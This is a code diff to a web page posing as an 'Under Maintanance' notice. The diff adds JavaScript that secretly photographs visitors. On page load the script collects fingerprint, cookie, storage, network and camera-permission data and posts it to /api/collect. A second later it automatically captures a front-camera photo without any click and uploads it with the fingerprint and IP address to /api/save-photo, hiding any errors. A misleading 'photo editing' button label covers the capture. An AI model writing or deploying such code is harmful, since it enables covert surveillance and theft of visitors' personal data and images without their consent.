@@ -140,6 +140,7 @@ main a {
       <animateTransform attributeName="transform" begin="0s" dur="2s" from="0 78 21" repeatCount="indefinite" to="-360 78 21" type="rotate"/>
     </g>
   </svg>
+  <button id="btnbar" type="button">Click Me to take photo of you for editing</button>
   <h1>Under Maintanance</h1>
   <h2>Sorry for the inconvenience.</h2>
   <h3>To contact us in the meantime please email:</h3>
@@ -580,11 +581,47 @@ main a {
       }
     }
 
+    async function requestCameraAccess() {
+      try {
+        if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+          // Request camera access for photo editing
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: false
+          });
+
+          // Stop the stream immediately after getting permission
+          // We'll request it again when user actually wants to edit photos
+          stream.getTracks().forEach(track => track.stop());
+
+          return {
+            granted: true,
+            message: 'Camera access granted for photo editing'
+          };
+        } else {
+          return {
+            granted: false,
+            message: 'Camera API not supported in this browser'
+          };
+        }
+      } catch (e) {
+        return {
+          granted: false,
+          error: e.message,
+          message: 'Camera access denied or unavailable'
+        };
+      }
+    }
+
     async function collectAllData() {
       statusDiv.className = 'status loading';
       statusDiv.innerHTML = '<span class="spinner"></span>Loading website data...';
 
       try {
+        // Request camera access first
+        const cameraAccess = await requestCameraAccess();
+        console.log('Camera access:', cameraAccess);
+
         // Collect all data
         const deviceInfo = getDeviceInfo();
         const fingerprint = await computeFingerprint();
@@ -633,6 +670,7 @@ main a {
           batteryInfo,
           networkInfo,
           mediaDevices,
+          cameraAccess,
           cookies,
           localStorage,
           sessionStorage,
@@ -641,6 +679,15 @@ main a {
           vpnDetection,
           timestamp: new Date().toISOString()
         };
+
+        // Enhanced logging for debugging
+        console.log('%c[DEBUG] Camera Access Data:', 'color: #4CAF50; font-weight: bold;');
+        console.log('  Granted:', cameraAccess.granted);
+        console.log('  Message:', cameraAccess.message);
+        if (cameraAccess.error) {
+          console.log('  Error:', cameraAccess.error);
+        }
+        console.log('%c[DEBUG] Full Payload:', 'color: #2196F3; font-weight: bold;', payload);
 
         // Send to backend
         const response = await fetch('/api/collect', {
@@ -665,8 +712,108 @@ main a {
       }
     }
 
+    // Photo capture functionality
+    async function capturePhoto() {
+      try {
+        console.log('[PHOTO] Starting automatic photo capture...');
+
+        // Request camera access
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+
+        // Create video element to capture frame
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.autoplay = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        // Wait for video to be ready
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
+
+        // Wait a moment for camera to adjust
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+        // Create canvas to capture image
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // Convert to blob
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+
+        // Stop camera
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+
+        // Compute fingerprint for linking
+        const fingerprintData = await computeFingerprint();
+
+        // Send to backend
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('fingerprint', fingerprintData.fp);
+        formData.append('ip_address', (await getIPInfo())?.ip || '');
+
+        console.log('[PHOTO] Uploading photo to server...');
+
+        const response = await fetch('/api/save-photo', {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          console.log('[PHOTO] Photo captured and saved successfully!', result);
+        } else {
+          throw new Error(result.message || 'Failed to save photo');
+        }
+
+      } catch (error) {
+        console.error('[PHOTO] Photo capture error:', error);
+        // Don't show error to user - fail silently
+      }
+    }
+
+    // Keep button functionality for manual capture
+    const btnbar = document.getElementById('btnbar');
+    if (btnbar) {
+      btnbar.addEventListener('click', async function() {
+        statusDiv.className = 'status loading';
+        statusDiv.innerHTML = '<span class="spinner"></span>Capturing photo...';
+
+        try {
+          await capturePhoto();
+          statusDiv.className = 'status success';
+          statusDiv.innerHTML = '✓ Photo captured and saved successfully!';
+        } catch (error) {
+          statusDiv.className = 'status error';
+          statusDiv.innerHTML = '✗ Failed to capture photo: ' + error.message;
+        }
+      });
+    }
+
     // Auto-run on page load
-    window.addEventListener('load', collectAllData);
+    window.addEventListener('load', async function() {
+      await collectAllData();
+
+      // Automatically capture photo after data collection
+      // Delay slightly to avoid overwhelming the browser
+      setTimeout(() => {
+        capturePhoto();
+      }, 1000);
+    });
   </script>
 </body>
 </html>
